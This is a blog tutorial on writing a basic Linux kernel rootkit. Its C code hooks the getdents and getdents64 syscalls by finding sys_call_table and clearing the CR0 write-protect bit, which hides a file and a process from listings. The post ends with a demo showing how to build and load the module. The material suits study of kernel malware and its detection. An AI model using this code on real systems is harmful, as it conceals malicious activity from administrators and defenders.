---
layout: post
title: "Linux Kernel Rootkit Basics"
author: "Grant"
tags: [hypervisor, stack-smashing, buffer overflow, security, kernel, linux]
---

# Rootkits
<hr>

Rootkits are an advanced form of malware that leverage elevated privileges to hide themselves from the operating system. In this post we will go over how to write a basic rootkit that is capable of hiding files and processes on Linux.

# Listing files in a directory

Let's look at a simple C program that can list files in a directory.

```c
#include <stdio.h>
#include <dirent.h>

int main() {
	DIR *d = opendir(".");
	struct dirent *dire;
	while ((dire = readdir(d)) != NULL) {
		printf("%s\n", dire->d_name);
	}
	closedir(d);
}
```

We can see that the `readdir()` function is called to get the files in a folder, however we're interested in going as low-level as possible to see what we need to hook in the kernel to manipulate the listed files for all programs. A good way of doing this is to use the `strace` tool to log all of the syscalls a program invokes.

```bash
$ strace./a.out
munmap(0x7fa11faa0000, 133984)          = 0
openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
fstat(3, {st_mode=S_IFDIR|S_ISVTX|0777, st_size=12288, ...}) = 0
brk(NULL)                               = 0x55ce40037000
brk(0x55ce40058000)                     = 0x55ce40058000
getdents(3, /* 28 entries */, 32768)    = 1376
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 4), ...}) = 0
write(1, ".\n", 2.)                      = 2
write(1, "..\n", 3..)                     = 3
```

Several syscalls are invoked by our program and right before we start seeing some recognized files printed out (".", ".."), `getdents()` is called. This is the syscall
that is used to get directory entries on Linux and therefore is what we want to hook to hide files.

# Hooking Syscalls
<hr>

## Syscall Table
In Linux, there is an [array in the kernel that contains pointers to all of the syscalls.](https://elixir.bootlin.com/linux/v5.5.7/source/arch/x86/entry/syscall_64.c#L27)

`asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1]`

The index into this array corresponds to the syscall number which you can [look up here](https://syscalls.kernelgrok.com/). Because of this, it is quite easy to hook a syscall function as we simply need to replace the function pointer for that syscall number to point to a function we define.

```c
// Pointer to sys_call_table in memory
static unsigned long *syscall_table = (unsigned long *)0xdeadbeef;
syscall_table[__NR_getdents] = hooked_getdents;
```

## Modifying Syscall Table

Since the memory region of the kernel containing the `sys_call_table` pointer is marked read-only, we can't modify it (even as ring 0) without first changing the permissions. To do this, we have to toggle the [WP bit (bit 16) in the CR0 register](https://en.wikipedia.org/wiki/Control_register#CR0).

```c
write_cr0(read_cr0() & (~ 0x10000)); //Enable write access
write_cr0(read_cr0() | 0x10000); //Restore write protection
```

## Getting The Address 

Finally, we need to get the address of the `sys_call_table` array inside the kernel. There are numerous ways to do this, but we will use a simple one below.

The `/proc/kallsyms` file contains a mapping of kernel symbols to addresses and thankfully includes the `sys_call_table` symbol we are interested in. We can see that in our instance,
it is located at `0xffffffff9fe00240`.

 **Note**: this will change across systems and even reboots as the kernel memory map is randomized for security reasons.

```bash
vagrant@ubuntu-bionic:~$ sudo cat /proc/kallsyms  | grep sys_call_table
ffffffff9fe00240 R sys_call_table
ffffffff9fe01600 R ia32_sys_call_table
```

Another, and perhaps easier way, is to use the `kallsyms_lookup_name()` function which returns a pointer to the symbol passed as a parameter. We can find the address of `sys_call_table` with the following code:

```c
unsigned long table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
```

## Putting it all together

Combining the steps above, in order to hook a syscall the steps will be roughly as follows:

1. Get the address of the `sys_call_table` pointer
2. Allow write access to kernel memory
3. Hook syscall function
4. Restore write protection to kernel memory


# Hiding Files
<hr>

As we saw above, the `getdents()` and `getdents64()` syscalls are used to get the the files in a directory, so we will want to hook these to hide files.

```c
unsigned long table = (unsigned long *) kallsyms_lookup_name("sys_call_table"); //Lookup table entry point
write_cr0(read_cr0() & (~ 0x10000)); //Enable write access
original_getdents = (void*)table[__NR_getdents];
original_getdents64 = (void*)table[__NR_getdents64];

table[__NR_getdents] = (unsigned long) my_getdents; //Hook getdents with our function
table[__NR_getdents64] = (unsigned long) my_getdents64;
write_cr0(read_cr0() | 0x10000); //Restore write protection
```

Now we will define our own function that implements `getdents()` and hides the file `secret.txt` by removing it from the list of files.

```c
asmlinkage int my_getdents(unsigned int fd, struct linux_dirent* dirp, 
	unsigned int count)
{
  int ret;
  struct linux_dirent* cur = dirp;
  int pos = 0;

  // Call original getdents
  ret = original_getdents(fd, dirp, count); 
  while (pos < ret) {

    if (is_prefix(cur->d_name, "secret.txt")) { // Insert your check here
      // Remove hidden file from list
      int reclen = cur->d_reclen;
      char* next_rec = (char*)cur + reclen;
      int len = (int)dirp + ret - (int)next_rec;
      memmove(cur, next_rec, len);
      ret -= reclen;
      continue;
    }
    pos += cur->d_reclen;
    cur = (struct linux_dirent*) ((char*)dirp + pos);
  }
  return ret;
}
```

# Hiding Processes
<hr>
On Linux, process information is stored in the `/proc/{pid}` folder and tools like `ps` read these entries to report on what processes are running. Since we already know how to hide files, all we need to do is hide the file that is the entry inside the `/proc` folder and it will not show up when `ps` is called!

The quickest way to do this is substitute the filename check from above with the PID:

```c
if (is_prefix(cur->d_name, "5048")) { // Insert your PID here
      // Remove hidden file from list
      int reclen = cur->d_reclen;
      char* next_rec = (char*)cur + reclen;
      int len = (int)dirp + ret - (int)next_rec;
      memmove(cur, next_rec, len);
      ret -= reclen;
      continue;
}
```

However this might hide some other files unintentionally, so it might be wise to check the full path.
# Demo
<hr>
Try it yourself!

```bash
vagrant init gfoudree/rootkit-dev --box-version 1
vagrant up
vagrant ssh
```

Now build and install the kernel module:

```bash
make
sudo insmod file_hider.ko
```

You should now notice that `secret.txt` is missing from the files in the current directory. Remove the kernel module `sudo rmmod file_hider` and observe that it appears again.